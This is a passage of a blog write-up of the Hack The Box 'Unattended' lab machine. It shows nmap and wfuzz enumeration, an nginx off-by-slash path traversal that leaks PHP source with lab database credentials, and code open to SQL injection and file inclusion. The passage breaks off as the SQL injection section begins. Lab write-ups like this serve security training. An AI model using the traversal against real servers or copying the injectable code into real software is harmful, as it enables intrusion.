<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Unattended - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Unattended"><a href="#Hack-The-Box-Unattended" class="headerlink" title="Hack The Box - Unattended"></a>Hack The Box - Unattended</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Unattended retired and here’s my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting <code>SQL</code> injection vulnerability that could be escalated to local file inclusion then to remote code execution and that’s my favorite part about this box. It’s a Linux box and its ip is <code>10.10.10.126</code>, I added it to <code>/etc/hosts</code> as <code>unattended.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/unattended/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC unattended.htb</code><br><img src="/images/hackthebox/unattended/1.png" alt=""><br>Only <code>http</code> and <code>https</code>, and surprisingly no <code>ssh</code>. Also the <code>ssl</code> certificate from the <code>https</code> port tells us that the common name is <code>www.nestedflanders.htb</code> so I added that to my hosts file :<br><img src="/images/hackthebox/unattended/2.png" alt=""></p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>Checking <code>unattended.htb</code> on both 80 and 443 gives us a blank page :<br><img src="/images/hackthebox/unattended/3.png" alt=""><br><img src="/images/hackthebox/unattended/4.png" alt=""><br><code>http://www.nestedflanders.htb</code> responds with a redirection to <code>https://www.nestedflanders.htb</code> which has the default Apache page :<br><img src="/images/hackthebox/unattended/5.png" alt=""><br>I used <code>wfuzz</code> to enumerate sub directories and it was weird to see both <code>index.php</code> and <code>index.html</code> with different content :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;unattended# wfuzz --hc 404 -c -u https:&#x2F;&#x2F;www.nestedflanders.htb&#x2F;FUZZ -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: https:&#x2F;&#x2F;www.nestedflanders.htb&#x2F;FUZZ</span><br><span class="line">Total requests: 4614</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000001:  C&#x3D;200    368 L      933 W        10701 Ch        &quot;&quot;</span><br><span class="line">000011:  C&#x3D;403     11 L       32 W          290 Ch        &quot;.hta&quot;</span><br><span class="line">000012:  C&#x3D;403     11 L       32 W          295 Ch        &quot;.htaccess&quot;</span><br><span class="line">000013:  C&#x3D;403     11 L       32 W          295 Ch        &quot;.htpasswd&quot;</span><br><span class="line">001241:  C&#x3D;301      7 L       12 W          185 Ch        &quot;dev&quot;</span><br><span class="line">002021:  C&#x3D;200     48 L      124 W         1244 Ch        &quot;index.php&quot;</span><br><span class="line">002020:  C&#x3D;200    368 L      933 W        10701 Ch        &quot;index.html&quot;</span><br><span class="line">003588:  C&#x3D;200     93 L      282 W         5086 Ch        &quot;server-status&quot;</span><br></pre></td></tr></table></figure>
<p>Also there was a sub directory called <code>/dev</code>.<br><code>/dev</code> :<br><img src="/images/hackthebox/unattended/6.png" alt=""><br><code>/index.html</code> :<br><img src="/images/hackthebox/unattended/7.png" alt=""><br><code>/index.php</code><br><img src="/images/hackthebox/unattended/8.png" alt=""></p>
<h2 id="Nginx-off-by-slash"><a href="#Nginx-off-by-slash" class="headerlink" title="Nginx off-by-slash"></a>Nginx off-by-slash</h2><p>When I checked <a href="https://www.wappalyzer.com/" target="_blank" rel="noopener"><code>wappalyzer</code></a> results I saw that it identified the web server as <code>nginx</code> and that was weird because we saw Apache’s default page. Also when I went to <code>https://www.nestedflanders.htb/dev</code> I got a redirection to <code>https://www.nestedflanders.htb/dev/</code> (It added a slash <code>/</code>). </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"white"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx/1.10.3<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;unattended# curl -k https:&#x2F;&#x2F;www.nestedflanders.htb&#x2F;dev&#x2F;</span><br><span class="line">dev site has been moved to his own server</span><br></pre></td></tr></table></figure>
<p>As demonstrated in <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">this document</a> there can be a vulnerability because of this. I gave it a try by adding <code>..</code> after <code>dev</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"white"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx/1.10.3<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We got <code>403</code> maybe because we are out of  <code>html</code> directory, I added <code>/html/index.php</code> and I successfully got the source of the index page :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended<span class="comment"># curl -k https://www.nestedflanders.htb/dev../html</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;<span class="number">301</span> Moved Permanently&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"white"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;<span class="number">301</span> Moved Permanently&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;center&gt;nginx/<span class="number">1.10</span><span class="number">.3</span>&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">root@kali:~/Desktop/HTB/boxes/unattended<span class="comment"># curl -k https://www.nestedflanders.htb/dev../html/index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"nestedflanders"</span>;</span><br><span class="line">$password = <span class="string">"1036913cf7d38d4ea4f79b050f171e9fbf3f5e"</span>;</span><br><span class="line">$db = <span class="string">"neddy"</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $db);</span><br><span class="line">$debug = <span class="keyword">False</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"6fb17817efb4131ae4ae1acae0f7fd48.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTplFromID</span><span class="params">($conn)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $debug;</span><br><span class="line">	$valid_ids = <span class="keyword">array</span> (<span class="number">25</span>,<span class="number">465</span>,<span class="number">587</span>);</span><br><span class="line">	<span class="keyword">if</span> ( (array_key_exists(<span class="string">'id'</span>, $_GET)) &amp;&amp; (intval($_GET[<span class="string">'id'</span>]) == $_GET[<span class="string">'id'</span>]) &amp;&amp; (in_array(intval($_GET[<span class="string">'id'</span>]),$valid_ids)) ) &#123;</span><br><span class="line">			$sql = <span class="string">"SELECT name FROM idname where id = '"</span>.$_GET[<span class="string">'id'</span>].<span class="string">"'"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$sql = <span class="string">"SELECT name FROM idname where id = '25'"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"sqltpl: $sql\n"</span>; &#125; </span><br><span class="line">	</span><br><span class="line">	$result = $conn-&gt;query($sql);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">		$ret = $row[<span class="string">'name'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$ret = <span class="string">'main'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"rettpl: $ret\n"</span>; &#125;</span><br><span class="line">	<span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathFromTpl</span><span class="params">($conn,$tpl)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $debug;</span><br><span class="line">	$sql = <span class="string">"SELECT path from filepath where name = '"</span>.$tpl.<span class="string">"'"</span>;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"sqlpath: $sql\n"</span>; &#125;</span><br><span class="line">	$result = $conn-&gt;query($sql);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">			$ret = $row[<span class="string">'path'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"retpath: $ret\n"</span>; &#125;</span><br><span class="line">	<span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$tpl = getTplFromID($conn);</span><br><span class="line">$inc = getPathFromTpl($conn,$tpl);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Ne(ste)d Flanders&lt;/title&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">  &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"bootstrap.min.css"</span>&gt;</span><br><span class="line">  &lt;script src=<span class="string">"jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=<span class="string">"bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">  &lt;h1&gt;Ne(ste)d Flanders<span class="string">' Portfolio&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div class="container"&gt;</span></span><br><span class="line"><span class="string">&lt;div center class="row"&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$sql = "SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '</span><span class="number">0</span><span class="string">' order by i.id";</span></span><br><span class="line"><span class="string">if ($debug) &#123; echo "sql: $sql\n"; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$result = $conn-&gt;query($sql);</span></span><br><span class="line"><span class="string">if ($result-&gt;num_rows &gt; 0) &#123;</span></span><br><span class="line"><span class="string">	while($row = $result-&gt;fetch_assoc()) &#123;</span></span><br><span class="line"><span class="string">		//if ($debug) &#123; echo "rowid: ".$row['</span>id<span class="string">']."\n"; &#125; // breaks layout</span></span><br><span class="line">		echo '&lt;div class="col-md-2"&gt;&lt;a href="index.php?id='.$row['id'].'" target="maifreim"&gt;'.$row['name'].'&lt;/a&gt;&lt;/div&gt;';</span><br><span class="line">		&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	&lt;div class="col-md-2"&gt;&lt;a href="index.php?id=25"&gt;main&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div class="col-md-2"&gt;&lt;a href="index.php?id=465"&gt;about&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div class="col-md-2"&gt;&lt;a href="index.php?id=587"&gt;contact&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt; &lt;!-- row --&gt;</span><br><span class="line">&lt;/div&gt; &lt;!-- container --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">&lt;div class="row"&gt;</span><br><span class="line">&lt;!-- &lt;div align=<span class="string">"center"</span>&gt; --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$inc"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- &lt;/div&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt; &lt;!-- row --&gt;</span><br><span class="line">&lt;/div&gt; &lt;!-- container --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"include $inc;\n"</span>; &#125; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><p>By looking at the <code>php</code> code we can see database credentials :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"nestedflanders"</span>;</span><br><span class="line">$password = <span class="string">"1036913cf7d38d4ea4f79b050f171e9fbf3f5e"</span>;</span><br><span class="line">$db = <span class="string">"neddy"</span>;</span><br></pre></td></tr></table></figure>
<p>Those can be helpful later.<br>Another thing I noticed was this include :</p>
